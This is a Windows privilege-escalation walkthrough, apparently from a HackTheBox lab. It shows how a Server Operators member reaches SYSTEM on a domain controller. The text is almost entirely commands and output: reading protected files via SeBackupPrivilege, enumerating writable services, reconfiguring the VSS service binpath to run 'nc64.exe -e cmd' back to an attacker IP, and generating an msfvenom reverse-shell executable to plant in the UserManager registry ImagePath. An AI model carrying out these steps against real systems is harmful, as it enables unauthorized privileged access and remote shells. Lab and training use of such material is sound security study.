Microsoft describes the **Server operators** group as someone who can create and delete network shared resources, start and stop services, back up and restore files, format the hard disk drive of the computer.
# [Method 1:](https://cube0x0.github.io/Pocing-Beyond-DA/) 
```console
*Evil-WinRM* PS C:\Users\svc-printer\Documents> net user svc-printer
User name                    svc-printer
Full Name                    SVCPrinter
Comment                      Service Account for Printer
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 1:15:13 AM
Password expires             Never
Password changeable          5/27/2021 1:15:13 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/26/2021 1:39:29 AM

Logon hours allowed          All

Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
The command completed successfully.
```
It is also possible to check the permissions of the current user and the groups to which this user belongs
```console
*Evil-WinRM* PS C:\Users\svc-printer\desktop> whoami /priv
*Evil-WinRM* PS C:\Users\svc-printer\desktop> whoami /groups
```
> A built-in group that exists only on domain controllers. By default, the group has no members. **Server Operators** can log on to a server interactively; create and delete network shares; start and stop services; back up and restore files; format the hard disk of the computer; and shut down the computer. 

## Reading Sensitive Files
```console
*Evil-WinRM* PS C:\Users\svc-printer\desktop> Import-Module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\Users\svc-printer\desktop> Import-Module .\SeBackupPrivilegeUtils.dll
*Evil-WinRM* PS C:\Users\svc-printer\desktop> Copy-FileSeBackupPrivilege C:\users\cube0x0\desktop\passwords.txt C:\windows\temp\pass -Overwrite
```
## Modifying Services
**Server Operators** has write permissions to a lot of services by default, we can enumerate which this way
```console
*Evil-WinRM* PS C:\Users\svc-printer\desktop> $services=(get-service).name | foreach {(Get-ServiceAcl $_)  | where {$_.access.IdentityReference -match 'Server Operators'}}
# Returns about 65 standard services that Server Operators have privileges over

# We can now search for which of these services is running with SYSTEM privileges
(gci HKLM:\SYSTEM\ControlSet001\Services |Get-ItemProperty | where {$_.ObjectName -match 'LocalSystem' -and $_.pschildname -in $services.name}).PSChildName
```
We choose one service from the output that is going to execute our command in the next step
```console
*Evil-WinRM* PS C:\programdata> sc.exe config VSS binpath="C:\programdata\nc64.exe -e cmd 10.10.14.6 443"
*Evil-WinRM* PS C:\programdata> sc.exe stop VSS
*Evil-WinRM* PS C:\programdata> sc.exe start VSS
```
# Method 2: Weak Registry Permission
By hijacking the **Registry** entries utilized by services, attackers can run their malicious payloads. An attacker can escalate privileges by exploiting Weak Registry permission if the current user has permission to alter Registry keys associated with the service. The resulting **WinPEAS.exe** will look like this for service misconfigurations:
```console
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking if you can modify any service registry
È Check if you can modify the registry of a service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-permissions
    HKLM\system\currentcontrolset\services\UserManager (Authenticated Users [FullControl])
```
There can be the following cases where we can modify the registry of the service either due to misconfiguration as the result above (FullControl for all users) or the user we own belongs to the **Server Operators** group so we has permission to modify the configuration of the service.

Following an initial foothold, we can query for service registry keys permissions using the **accesschk.exe** Sysinternals tool.
```console
*Evil-WinRM* PS C:\programdata> .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\UserManager
```
Identify the binary Path of the UserManager Service by using reg query command.
```console
*Evil-WinRM* PS C:\programdata> reg query HKLM\system\currentcontrolset\services\Spooler /s  /v imagepath
```
We can then check the ACL's over the service. Below we see the owner is **NT AUTHORITY\SYSTEM** and the **Server Operators** group has the ability to *SetValue* which allows us to reconfigure the binary path
```console
*Evil-WinRM* PS C:\Users\svc-printer\Documents> Get-Acl HKLM:\system\currentcontrolset\services\UserManager | Format-List


Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\system\currentcontrolset\services\UserManager
Owner  : NT AUTHORITY\SYSTEM
Group  : NT AUTHORITY\SYSTEM
Access : NT AUTHORITY\Authenticated Users Allow  ReadKey
         NT AUTHORITY\Authenticated Users Allow  -2147483648
         BUILTIN\Server Operators Allow  SetValue, CreateSubKey, Delete, ReadKey
         BUILTIN\Server Operators Allow  -1073676288
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Administrators Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         CREATOR OWNER Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -2147483648
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow  ReadKey
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow  -2147483648
```
On local machine
```console
┌─[kimkhuongduy@drgon]─[~/Documents/hackthebox/window/Return]
└──╼ $msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.5 LPORT=7777 -f exe -o reverse.exe
```
Overwrite the **ImagePath** registry key to point to our reverse shell executable:
```console
*Evil-WinRM* PS C:\Users\svc-printer\Documents> REG add HKLM\system\currentcontrolset\services\UserManager /v ImagePath /t REG_EXPAND_SZ /d "C:\Users\svc-printer\Documents\reverse.exe" /f
```
Listen with **nc** on the local and proceed to restart the service:
```console
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe stop UserManager
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start UserManager
```
